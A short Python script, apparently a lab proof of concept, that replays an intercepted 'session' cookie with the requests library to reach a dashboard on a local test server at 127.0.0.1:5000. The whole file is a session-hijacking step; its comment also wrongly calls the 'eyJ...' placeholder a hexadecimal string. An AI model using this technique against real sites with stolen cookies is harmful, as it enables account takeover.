import requests # type: ignore

# Example: the intercepted session cookie value (hexadecimal string)
hijacked_cookie_value = "eyJ...your_cookie_data_here..."
target_url = "http://127.0.0.1:5000/dashboard"

# Use a session to set the cookie manually
s = requests.Session()
s.cookies.set("session", hijacked_cookie_value, domain="127.0.0.1")

response = s.get(target_url)
print("Response status code:", response.status_code)
print("Response body:", response.text)
